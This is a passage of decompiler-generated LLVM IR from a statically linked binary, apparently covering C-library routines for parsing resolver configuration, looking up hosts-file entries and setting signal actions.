  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_1000e0b4 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_1000e0b4, i32* @r3, align 4
  %v0_1000e0bc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_100249b0.604 to i32), i32* %r3.global-to-local, align 4
  %v0_1000e0c4 = call i32 @__pthread_return_0()
  store i32 %v0_1000e0c4, i32* %r3.global-to-local, align 4
  %v3_1000e0cc = load i32, i32* @global_var_10024a94.605, align 4
  %v2_1000e0d0 = icmp sgt i32 %v3_1000e0cc, 0
  br i1 %v2_1000e0d0, label %dec_label_pc_1000e348, label %dec_label_pc_1000e0d8

dec_label_pc_1000e0d8:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_100138f8.666 to i32), i32* %r3.global-to-local, align 4
  store i32 268493040, i32* @lr, align 4
  %v3_1000e0ec = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_100138f8.666 to i32), i32 ptrtoint (i32* @global_var_1001390c.665 to i32))
  store i32 %v3_1000e0ec, i32* %r3.global-to-local, align 4
  store i32 %v3_1000e0ec, i32* @r26, align 4
  %v3_1000e0f0 = icmp eq i32 %v3_1000e0ec, 0
  br i1 %v3_1000e0f0, label %dec_label_pc_1000e0f8, label %dec_label_pc_1000e30c.preheader

dec_label_pc_1000e0f8:                            ; preds = %dec_label_pc_1000e0d8
  %v0_1000e0fc = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_10013910.667 to i32), i32* %r3.global-to-local, align 4
  store i32 268493064, i32* @lr, align 4
  %v3_1000e104 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_10013910.667 to i32), i32 %v0_1000e0fc)
  store i32 %v3_1000e104, i32* %r3.global-to-local, align 4
  store i32 %v3_1000e104, i32* @r26, align 4
  %v3_1000e108 = icmp eq i32 %v3_1000e104, 0
  br i1 %v3_1000e108, label %dec_label_pc_1000e33c, label %dec_label_pc_1000e30c.preheader

dec_label_pc_1000e30c.preheader:                  ; preds = %dec_label_pc_1000e0d8, %dec_label_pc_1000e0f8
  %v0_1000e31816 = phi i32 [ %v3_1000e0ec, %dec_label_pc_1000e0d8 ], [ %v3_1000e104, %dec_label_pc_1000e0f8 ]
  %v2_1000e30c = ptrtoint i32* %stack_var_-164 to i32
  %v1_1000e1182 = bitcast i32* %stack_var_-164 to i8*
  %v3_1000e1fc = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_1000e30c

dec_label_pc_1000e114:                            ; preds = %dec_label_pc_1000e12c
  %v1_1000e114 = add i32 %v0_1000e1d49, 1
  store i32 %v1_1000e114, i32* %r3.global-to-local, align 4
  %v1_1000e118 = inttoptr i32 %v1_1000e114 to i8*
  %v2_1000e118 = load i8, i8* %v1_1000e118, align 1
  %v3_1000e118 = zext i8 %v2_1000e118 to i32
  store i32 %v3_1000e118, i32* %r11.global-to-local, align 4
  %v3_1000e120 = icmp eq i8 %v2_1000e118, 0
  br i1 %v3_1000e120, label %dec_label_pc_1000e30c.backedge, label %dec_label_pc_1000e12c

dec_label_pc_1000e12c:                            ; preds = %dec_label_pc_1000e12c.lr.ph, %dec_label_pc_1000e114
  %v0_1000e130.in = phi i32 [ %v3_1000e1184, %dec_label_pc_1000e12c.lr.ph ], [ %v3_1000e118, %dec_label_pc_1000e114 ]
  %v0_1000e144 = phi i32 [ %v3_1000e1184, %dec_label_pc_1000e12c.lr.ph ], [ %v3_1000e118, %dec_label_pc_1000e114 ]
  %v0_1000e1d49 = phi i32 [ %v2_1000e30c, %dec_label_pc_1000e12c.lr.ph ], [ %v1_1000e114, %dec_label_pc_1000e114 ]
  %v0_1000e130 = mul nuw nsw i32 %v0_1000e130.in, 2
  %v2_1000e130 = add i32 %v0_1000e130, %v3_1000e12c.pre
  %v3_1000e130 = inttoptr i32 %v2_1000e130 to i16*
  %v4_1000e130 = load i16, i16* %v3_1000e130, align 2
  %v1_1000e134 = and i16 %v4_1000e130, 32
  %v3_1000e134 = icmp eq i16 %v1_1000e134, 0
  br i1 %v3_1000e134, label %dec_label_pc_1000e13c, label %dec_label_pc_1000e114

dec_label_pc_1000e13c:                            ; preds = %dec_label_pc_1000e12c
  %v3_1000e13c = icmp eq i32 %v0_1000e144, 10
  br i1 %v3_1000e13c, label %dec_label_pc_1000e30c.backedge, label %dec_label_pc_1000e144

dec_label_pc_1000e30c.backedge:                   ; preds = %dec_label_pc_1000e114, %dec_label_pc_1000e2c0, %dec_label_pc_1000e2c8, %dec_label_pc_1000e300, %dec_label_pc_1000e118.preheader, %dec_label_pc_1000e13c, %dec_label_pc_1000e144, %dec_label_pc_1000e268
  %v0_1000e318.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000e30c

dec_label_pc_1000e144:                            ; preds = %dec_label_pc_1000e13c
  %v3_1000e144 = icmp eq i32 %v0_1000e144, 35
  br i1 %v3_1000e144, label %dec_label_pc_1000e30c.backedge, label %dec_label_pc_1000e14c

dec_label_pc_1000e14c:                            ; preds = %dec_label_pc_1000e144
  store i32 0, i32* @r27, align 4
  store i32 %v2_1000e0b4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000e1d410 = inttoptr i32 %v0_1000e1d49 to i8*
  %v2_1000e1d411 = load i8, i8* %v1_1000e1d410, align 1
  %v3_1000e1d814 = icmp eq i8 %v2_1000e1d411, 0
  br i1 %v3_1000e1d814, label %dec_label_pc_1000e1e8, label %dec_label_pc_1000e1e0

dec_label_pc_1000e160:                            ; preds = %dec_label_pc_1000e1e0
  %v1_1000e160 = mul i32 %v0_1000e160, 4
  %v3_1000e164 = load i32, i32* @global_var_100249f0, align 4
  store i32 %v3_1000e164, i32* %r11.global-to-local, align 4
  %v1_1000e168 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000e168 = add i32 %v1_1000e168, %v1_1000e160
  %v2_1000e16c = add i32 %v2_1000e168, 16
  %v3_1000e16c = inttoptr i32 %v2_1000e16c to i32*
  store i32 %v0_1000e16c, i32* %v3_1000e16c, align 4
  %v0_1000e178.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e178

dec_label_pc_1000e174:                            ; preds = %dec_label_pc_1000e18c
  %v1_1000e174 = add i32 %v0_1000e174, 1
  store i32 %v1_1000e174, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e178

dec_label_pc_1000e178:                            ; preds = %dec_label_pc_1000e160, %dec_label_pc_1000e174
  %v0_1000e174 = phi i32 [ %v0_1000e178.pre, %dec_label_pc_1000e160 ], [ %v1_1000e174, %dec_label_pc_1000e174 ]
  %v1_1000e178 = inttoptr i32 %v0_1000e174 to i8*
  %v2_1000e178 = load i8, i8* %v1_1000e178, align 1
  %v3_1000e17c = icmp eq i8 %v2_1000e178, 0
  br i1 %v3_1000e17c, label %dec_label_pc_1000e1a8, label %dec_label_pc_1000e18c

dec_label_pc_1000e18c:                            ; preds = %dec_label_pc_1000e178
  %v3_1000e184 = icmp eq i8 %v2_1000e178, 10
  %v3_1000e178 = zext i8 %v2_1000e178 to i32
  %v1_1000e180 = mul nuw nsw i32 %v3_1000e178, 2
  %v1_1000e18c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e18c = add i32 %v1_1000e18c, %v1_1000e180
  %v3_1000e18c = inttoptr i32 %v2_1000e18c to i16*
  %v4_1000e18c = load i16, i16* %v3_1000e18c, align 2
  %v1_1000e190 = and i16 %v4_1000e18c, 32
  %v3_1000e190.not = icmp ne i16 %v1_1000e190, 0
  %brmerge = or i1 %v3_1000e184, %v3_1000e190.not
  br i1 %brmerge, label %dec_label_pc_1000e1a8, label %dec_label_pc_1000e174

dec_label_pc_1000e1a0:                            ; preds = %dec_label_pc_1000e1bc
  %v0_1000e1a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e1a0 = trunc i32 %v0_1000e1a0 to i8
  store i8 %v1_1000e1a0, i8* %v1_1000e1a8, align 1
  %v0_1000e1a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e1a4 = add i32 %v0_1000e1a4, 1
  store i32 %v1_1000e1a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e1a8

dec_label_pc_1000e1a8:                            ; preds = %dec_label_pc_1000e18c, %dec_label_pc_1000e178, %dec_label_pc_1000e1a0
  %v0_1000e1d4 = phi i32 [ %v1_1000e1a4, %dec_label_pc_1000e1a0 ], [ %v0_1000e174, %dec_label_pc_1000e178 ], [ %v0_1000e174, %dec_label_pc_1000e18c ]
  %v1_1000e1a8 = inttoptr i32 %v0_1000e1d4 to i8*
  %v2_1000e1a8 = load i8, i8* %v1_1000e1a8, align 1
  %v3_1000e1a8 = zext i8 %v2_1000e1a8 to i32
  %v3_1000e1ac = icmp eq i8 %v2_1000e1a8, 0
  %v1_1000e1b0 = mul nuw nsw i32 %v3_1000e1a8, 2
  store i32 %v1_1000e1b0, i32* %r11.global-to-local, align 4
  br i1 %v3_1000e1ac, label %dec_label_pc_1000e1d0, label %dec_label_pc_1000e1bc

dec_label_pc_1000e1bc:                            ; preds = %dec_label_pc_1000e1a8
  %v3_1000e1b4 = icmp eq i8 %v2_1000e1a8, 10
  %v3_1000e1bc = load i32, i32* @global_var_100249f0, align 4
  %v2_1000e1c0 = add i32 %v3_1000e1bc, %v1_1000e1b0
  %v3_1000e1c0 = inttoptr i32 %v2_1000e1c0 to i16*
  %v4_1000e1c0 = load i16, i16* %v3_1000e1c0, align 2
  %v1_1000e1c4 = and i16 %v4_1000e1c0, 32
  %v3_1000e1c4.not = icmp ne i16 %v1_1000e1c4, 0
  %brmerge27 = or i1 %v3_1000e1b4, %v3_1000e1c4.not
  br i1 %brmerge27, label %dec_label_pc_1000e1a0, label %dec_label_pc_1000e1d0

dec_label_pc_1000e1d0:                            ; preds = %dec_label_pc_1000e1bc, %dec_label_pc_1000e1a8
  %v0_1000e1d0 = load i32, i32* @r27, align 4
  %v1_1000e1d0 = add i32 %v0_1000e1d0, 1
  store i32 %v1_1000e1d0, i32* @r27, align 4
  %v2_1000e1d4 = load i8, i8* %v1_1000e1a8, align 1
  %v3_1000e1d8 = icmp eq i8 %v2_1000e1d4, 0
  br i1 %v3_1000e1d8, label %dec_label_pc_1000e1e8, label %dec_label_pc_1000e1e0

dec_label_pc_1000e1e0:                            ; preds = %dec_label_pc_1000e14c, %dec_label_pc_1000e1d0
  %v0_1000e16c = phi i32 [ %v0_1000e1d4, %dec_label_pc_1000e1d0 ], [ %v0_1000e1d49, %dec_label_pc_1000e14c ]
  %v0_1000e160 = phi i32 [ %v1_1000e1d0, %dec_label_pc_1000e1d0 ], [ 0, %dec_label_pc_1000e14c ]
  %tmp33 = icmp slt i32 %v0_1000e160, 5
  br i1 %tmp33, label %dec_label_pc_1000e160, label %dec_label_pc_1000e1e8

dec_label_pc_1000e1e8:                            ; preds = %dec_label_pc_1000e1d0, %dec_label_pc_1000e1e0, %dec_label_pc_1000e14c
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_10013928.668 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_1000e1fc = call i32 @__GI_strcoll(i8* %v3_1000e1fc, i32 ptrtoint ([11 x i8]* @global_var_10013928.668 to i32))
  store i32 %v4_1000e1fc, i32* %r3.global-to-local, align 4
  %v3_1000e200 = icmp eq i32 %v4_1000e1fc, 0
  br i1 %v3_1000e200, label %dec_label_pc_1000e22c, label %dec_label_pc_1000e250

dec_label_pc_1000e20c:                            ; preds = %dec_label_pc_1000e244
  %v1_1000e20c = add i32 %v2_1000e234, 24
  %v2_1000e20c = inttoptr i32 %v1_1000e20c to i32*
  %v3_1000e20c = load i32, i32* %v2_1000e20c, align 4
  store i32 %v3_1000e20c, i32* %r3.global-to-local, align 4
  store i32 268493332, i32* @lr, align 4
  %v1_1000e210 = call i32 @__GI_strdup(i32 %v3_1000e20c)
  store i32 %v1_1000e210, i32* %r3.global-to-local, align 4
  %v0_1000e218 = load i32, i32* @r29, align 4
  %v1_1000e218 = add i32 %v0_1000e218, 1
  store i32 %v1_1000e218, i32* %r11.global-to-local, align 4
  %v1_1000e21c = mul i32 %v0_1000e218, 4
  store i32 %v1_1000e218, i32* @global_var_10024a94.605, align 4
  %v3_1000e228 = add i32 %v1_1000e21c, ptrtoint (i32* @global_var_1002ad90.606 to i32)
  %v4_1000e228 = inttoptr i32 %v3_1000e228 to i32*
  store i32 %v1_1000e210, i32* %v4_1000e228, align 4
  br label %dec_label_pc_1000e22c

dec_label_pc_1000e22c:                            ; preds = %dec_label_pc_1000e1e8, %dec_label_pc_1000e20c
  %v0_1000e22c = load i32, i32* @r31, align 4
  %v1_1000e22c = load i32, i32* @r27, align 4
  %v2_1000e22c = icmp slt i32 %v0_1000e22c, %v1_1000e22c
  %v1_1000e230 = mul i32 %v0_1000e22c, 4
  %v0_1000e234 = load i32, i32* @r1, align 4
  %v2_1000e234 = add i32 %v0_1000e234, %v1_1000e230
  br i1 %v2_1000e22c, label %dec_label_pc_1000e244, label %dec_label_pc_1000e250

dec_label_pc_1000e244:                            ; preds = %dec_label_pc_1000e22c
  %v3_1000e244 = load i32, i32* @global_var_10024a94.605, align 4
  %tmp35 = icmp slt i32 %v3_1000e244, 3
  br i1 %tmp35, label %dec_label_pc_1000e20c, label %dec_label_pc_1000e250

dec_label_pc_1000e250:                            ; preds = %dec_label_pc_1000e244, %dec_label_pc_1000e22c, %dec_label_pc_1000e1e8
  %v0_1000e254 = load i32, i32* @r30, align 4
  store i32 %v0_1000e254, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10013934.669 to i32), i32* @r4, align 4
  %v3_1000e25c = inttoptr i32 %v0_1000e254 to i8*
  %v4_1000e25c = call i32 @__GI_strcoll(i8* %v3_1000e25c, i32 ptrtoint ([7 x i8]* @global_var_10013934.669 to i32))
  store i32 %v4_1000e25c, i32* %r3.global-to-local, align 4
  %v3_1000e260 = icmp eq i32 %v4_1000e25c, 0
  br i1 %v3_1000e260, label %dec_label_pc_1000e2a0.preheader, label %dec_label_pc_1000e268

dec_label_pc_1000e268:                            ; preds = %dec_label_pc_1000e250
  %v0_1000e26c = load i32, i32* @r30, align 4
  store i32 %v0_1000e26c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001393c.670 to i32), i32* @r4, align 4
  %v3_1000e274 = inttoptr i32 %v0_1000e26c to i8*
  %v4_1000e274 = call i32 @__GI_strcoll(i8* %v3_1000e274, i32 ptrtoint ([7 x i8]* @global_var_1001393c.670 to i32))
  store i32 %v4_1000e274, i32* %r3.global-to-local, align 4
  %v3_1000e278 = icmp eq i32 %v4_1000e274, 0
  br i1 %v3_1000e278, label %dec_label_pc_1000e2a0.preheader, label %dec_label_pc_1000e30c.backedge

dec_label_pc_1000e2a0.preheader:                  ; preds = %dec_label_pc_1000e250, %dec_label_pc_1000e268
  store i32 ptrtoint (i32* @global_var_1002ad80.657 to i32), i32* @r31, align 4
  %v3_1000e2ac41 = load i32, i32* @global_var_10024a98.655, align 4
  %v2_1000e2b043 = icmp sgt i32 %v3_1000e2ac41, 0
  %v1_1000e2b445 = add i32 %v3_1000e2ac41, -1
  %v1_1000e2b846 = mul i32 %v1_1000e2b445, 4
  store i32 %v1_1000e2b846, i32* %r11.global-to-local, align 4
  br i1 %v2_1000e2b043, label %dec_label_pc_1000e284, label %dec_label_pc_1000e2c0

dec_label_pc_1000e284:                            ; preds = %dec_label_pc_1000e2a0.preheader, %dec_label_pc_1000e284
  %v1_1000e2b848 = phi i32 [ %v1_1000e2b8, %dec_label_pc_1000e284 ], [ %v1_1000e2b846, %dec_label_pc_1000e2a0.preheader ]
  %v1_1000e2b447 = phi i32 [ %v1_1000e2b4, %dec_label_pc_1000e284 ], [ %v1_1000e2b445, %dec_label_pc_1000e2a0.preheader ]
  %v2_1000e284 = add i32 %v1_1000e2b848, ptrtoint (i32* @global_var_1002ad80.657 to i32)
  %v3_1000e284 = inttoptr i32 %v2_1000e284 to i32*
  %v4_1000e284 = load i32, i32* %v3_1000e284, align 4
  store i32 %v4_1000e284, i32* @r3, align 4
  store i32 %v1_1000e2b447, i32* @global_var_10024a98.655, align 4
  store i32 268493456, i32* @lr, align 4
  %v0_1000e28c = call i32 @free()
  store i32 %v0_1000e28c, i32* %r3.global-to-local, align 4
  %v3_1000e290 = load i32, i32* @global_var_10024a98.655, align 4
  %v1_1000e298 = mul i32 %v3_1000e290, 4
  %v1_1000e29c = load i32, i32* @r31, align 4
  %v3_1000e29c = add i32 %v1_1000e29c, %v1_1000e298
  %v4_1000e29c = inttoptr i32 %v3_1000e29c to i32*
  store i32 0, i32* %v4_1000e29c, align 4
  store i32 ptrtoint (i32* @global_var_1002ad80.657 to i32), i32* @r31, align 4
  %v3_1000e2ac = load i32, i32* @global_var_10024a98.655, align 4
  %v2_1000e2b0 = icmp sgt i32 %v3_1000e2ac, 0
  %v1_1000e2b4 = add i32 %v3_1000e2ac, -1
  %v1_1000e2b8 = mul i32 %v1_1000e2b4, 4
  store i32 %v1_1000e2b8, i32* %r11.global-to-local, align 4
  br i1 %v2_1000e2b0, label %dec_label_pc_1000e284, label %dec_label_pc_1000e2c0

dec_label_pc_1000e2c0:                            ; preds = %dec_label_pc_1000e284, %dec_label_pc_1000e2a0.preheader
  %v3_1000e30059 = phi i32 [ %v3_1000e2ac41, %dec_label_pc_1000e2a0.preheader ], [ %v3_1000e2ac, %dec_label_pc_1000e284 ]
  %v1_1000e2e849 = load i32, i32* @r27, align 4
  %v2_1000e2e850 = icmp sgt i32 %v1_1000e2e849, 1
  %v0_1000e2f053 = load i32, i32* @r1, align 4
  %v2_1000e2f054 = add i32 %v0_1000e2f053, 4
  br i1 %v2_1000e2e850, label %dec_label_pc_1000e300, label %dec_label_pc_1000e30c.backedge

dec_label_pc_1000e2c8:                            ; preds = %dec_label_pc_1000e300
  %v1_1000e2c8 = add i32 %v2_1000e2f055, 24
  %v2_1000e2c8 = inttoptr i32 %v1_1000e2c8 to i32*
  %v3_1000e2c8 = load i32, i32* %v2_1000e2c8, align 4
  store i32 %v3_1000e2c8, i32* %r3.global-to-local, align 4
  store i32 268493520, i32* @lr, align 4
  %v1_1000e2cc = call i32 @__GI_strdup(i32 %v3_1000e2c8)
  store i32 %v1_1000e2cc, i32* %r3.global-to-local, align 4
  %v0_1000e2d4 = load i32, i32* @r29, align 4
  %v1_1000e2d4 = add i32 %v0_1000e2d4, 1
  store i32 %v1_1000e2d4, i32* %r11.global-to-local, align 4
  %v1_1000e2d8 = mul i32 %v0_1000e2d4, 4
  store i32 %v1_1000e2d4, i32* @global_var_10024a98.655, align 4
  %v3_1000e2e4 = add i32 %v1_1000e2d8, ptrtoint (i32* @global_var_1002ad80.657 to i32)
  %v4_1000e2e4 = inttoptr i32 %v3_1000e2e4 to i32*
  store i32 %v1_1000e2cc, i32* %v4_1000e2e4, align 4
  %v0_1000e2e8.pre = load i32, i32* @r31, align 4
  %v1_1000e2e8 = load i32, i32* @r27, align 4
  %v2_1000e2e8 = icmp slt i32 %v0_1000e2e8.pre, %v1_1000e2e8
  br i1 %v2_1000e2e8, label %dec_label_pc_1000e2c8.dec_label_pc_1000e300_crit_edge, label %dec_label_pc_1000e30c.backedge

dec_label_pc_1000e2c8.dec_label_pc_1000e300_crit_edge: ; preds = %dec_label_pc_1000e2c8
  %v0_1000e2f0 = load i32, i32* @r1, align 4
  %v1_1000e2ec = mul i32 %v0_1000e2e8.pre, 4
  %v2_1000e2f0 = add i32 %v0_1000e2f0, %v1_1000e2ec
  %v3_1000e300.pre = load i32, i32* @global_var_10024a98.655, align 4
  br label %dec_label_pc_1000e300

dec_label_pc_1000e300:                            ; preds = %dec_label_pc_1000e2c0, %dec_label_pc_1000e2c8.dec_label_pc_1000e300_crit_edge
  %v3_1000e300 = phi i32 [ %v3_1000e300.pre, %dec_label_pc_1000e2c8.dec_label_pc_1000e300_crit_edge ], [ %v3_1000e30059, %dec_label_pc_1000e2c0 ]
  %v2_1000e2f055 = phi i32 [ %v2_1000e2f0, %dec_label_pc_1000e2c8.dec_label_pc_1000e300_crit_edge ], [ %v2_1000e2f054, %dec_label_pc_1000e2c0 ]
  %tmp37 = icmp slt i32 %v3_1000e300, 4
  br i1 %tmp37, label %dec_label_pc_1000e2c8, label %dec_label_pc_1000e30c.backedge

dec_label_pc_1000e30c:                            ; preds = %dec_label_pc_1000e30c.backedge, %dec_label_pc_1000e30c.preheader
  %v0_1000e318 = phi i32 [ %v0_1000e318.pre, %dec_label_pc_1000e30c.backedge ], [ %v0_1000e31816, %dec_label_pc_1000e30c.preheader ]
  store i32 %v2_1000e30c, i32* %r3.global-to-local, align 4
  store i32 268493600, i32* @lr, align 4
  %v3_1000e31c = call i32 @fgets(i32 %v2_1000e30c, i32 128, i32 %v0_1000e318)
  store i32 %v3_1000e31c, i32* %r3.global-to-local, align 4
  %v3_1000e320 = icmp eq i32 %v3_1000e31c, 0
  br i1 %v3_1000e320, label %dec_label_pc_1000e330, label %dec_label_pc_1000e118.preheader

dec_label_pc_1000e118.preheader:                  ; preds = %dec_label_pc_1000e30c
  store i32 %v2_1000e30c, i32* %r3.global-to-local, align 4
  %v2_1000e1183 = load i8, i8* %v1_1000e1182, align 4
  %v3_1000e1184 = zext i8 %v2_1000e1183 to i32
  store i32 %v3_1000e1184, i32* %r11.global-to-local, align 4
  %v3_1000e1206 = icmp eq i8 %v2_1000e1183, 0
  br i1 %v3_1000e1206, label %dec_label_pc_1000e30c.backedge, label %dec_label_pc_1000e12c.lr.ph

dec_label_pc_1000e12c.lr.ph:                      ; preds = %dec_label_pc_1000e118.preheader
  %v3_1000e12c.pre = load i32, i32* @global_var_100249f0, align 4
  br label %dec_label_pc_1000e12c

dec_label_pc_1000e330:                            ; preds = %dec_label_pc_1000e30c
  %v0_1000e330 = load i32, i32* @r26, align 4
  store i32 %v0_1000e330, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e338.671 to i32), i32* @lr, align 4
  %v1_1000e334 = inttoptr i32 %v0_1000e330 to i16*
  %v2_1000e334 = call i32 @__GI_fclose(i16* %v1_1000e334)
  store i32 %v2_1000e334, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e348

dec_label_pc_1000e33c:                            ; preds = %dec_label_pc_1000e0f8
  %v0_1000e33c = call i32 @__GI___h_errno_location()
  store i32 %v0_1000e33c, i32* %r3.global-to-local, align 4
  %v2_1000e344 = inttoptr i32 %v0_1000e33c to i32*
  store i32 3, i32* %v2_1000e344, align 4
  br label %dec_label_pc_1000e348

dec_label_pc_1000e348:                            ; preds = %entry, %dec_label_pc_1000e330, %dec_label_pc_1000e33c
  store i32 %v2_1000e0b4, i32* @r3, align 4
  %v0_1000e350 = call i32 @__pthread_return_void()
  store i32 %v0_1000e350, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e350

; uselistorder directives
  uselistorder i32 %v3_1000e1184, { 2, 0, 1 }
  uselistorder i32 %v1_1000e2b846, { 1, 0 }
  uselistorder i32 %v1_1000e2b445, { 1, 0 }
  uselistorder i32 %v0_1000e160, { 1, 0 }
  uselistorder i32 %v1_1000e1b0, { 1, 0 }
  uselistorder i8* %v1_1000e1a8, { 0, 2, 1 }
  uselistorder i8 %v2_1000e178, { 2, 0, 1 }
  uselistorder i32 %v0_1000e174, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1000e118, { 1, 0, 2 }
  uselistorder i32 %v1_1000e114, { 0, 2, 1 }
  uselistorder i32 %v2_1000e30c, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000e0b4, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 1, 21, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 18, 0, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @free, { 17, 14, 13, 12, 11, 10, 9, 8, 23, 22, 1, 7, 6, 5, 4, 16, 15, 18, 21, 20, 19, 3, 2, 0 }
  uselistorder i32* @global_var_10024a98.655, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ad80.657 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ad90.606 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100249b0.604 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000e348, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e300, { 1, 0 }
  uselistorder label %dec_label_pc_1000e284, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2a0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000e22c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e1e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e178, { 1, 0 }
  uselistorder label %dec_label_pc_1000e30c.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000e30c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_1000e36c = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268493740, i32* @lr, align 4
  %v9_1000e3a8 = inttoptr i32 %arg3 to i32*
  %v10_1000e3a8 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1000e3a8, i32 %arg4, i32 %arg5, i32 %v4_1000e36c, i32 %arg7)
  ret i32 %v10_1000e3a8
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000e3c4 = load i32, i32* @lr, align 4
  store i32 %v0_1000e3c4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e3d0 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000e3e0 = add i32 %tmp, 4
  store i32 %v1_1000e3e0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000e3e8 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000e3e8, i32* @r3, align 4
  br i1 %v3_1000e3d0, label %dec_label_pc_1000e410, label %dec_label_pc_1000e3f0

dec_label_pc_1000e3f0:                            ; preds = %entry
  %v2_1000e3f0 = load i32, i32* %arg2, align 4
  store i32 %v2_1000e3f0, i32* %r0.global-to-local, align 4
  store i32 268493820, i32* @lr, align 4
  %v0_1000e3f8 = call i32 @memcpy()
  %v0_1000e3fc = load i32, i32* @r31, align 4
  %v1_1000e3fc = add i32 %v0_1000e3fc, 132
  %v2_1000e3fc = inttoptr i32 %v1_1000e3fc to i32*
  %v3_1000e3fc = load i32, i32* %v2_1000e3fc, align 4
  store i32 %v3_1000e3fc, i32* %r0.global-to-local, align 4
  %v1_1000e408 = add i32 %v0_1000e3fc, 136
  %v2_1000e408 = inttoptr i32 %v1_1000e408 to i32*
  %v3_1000e408 = load i32, i32* %v2_1000e408, align 4
  store i32 %v3_1000e408, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e410

dec_label_pc_1000e410:                            ; preds = %entry, %dec_label_pc_1000e3f0
  store i32 268493872, i32* @lr, align 4
  %v0_1000e42c = call i32 @__syscall_rt_sigaction()
  %v0_1000e430 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000e430 = icmp eq i32 %v0_1000e430, 0
  store i32 %v0_1000e42c, i32* @r31, align 4
  br i1 %v3_1000e430, label %dec_label_pc_1000e46c, label %dec_label_pc_1000e440

dec_label_pc_1000e440:                            ; preds = %dec_label_pc_1000e410
  %v1_1000e438 = icmp slt i32 %v0_1000e42c, 0
  %v1_1000e440 = add i32 %v0_1000e430, 4
  store i32 %v1_1000e440, i32* @r3, align 4
  %v2_1000e444 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000e444, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000e438, label %dec_label_pc_1000e46c, label %dec_label_pc_1000e450

dec_label_pc_1000e450:                            ; preds = %dec_label_pc_1000e440
  %v3_1000e450 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000e450, i32* %r0.global-to-local, align 4
  %v2_1000e454 = inttoptr i32 %v0_1000e430 to i32*
  store i32 %v3_1000e450, i32* %v2_1000e454, align 4
  store i32 268493916, i32* @lr, align 4
  %v0_1000e458 = call i32 @memcpy()
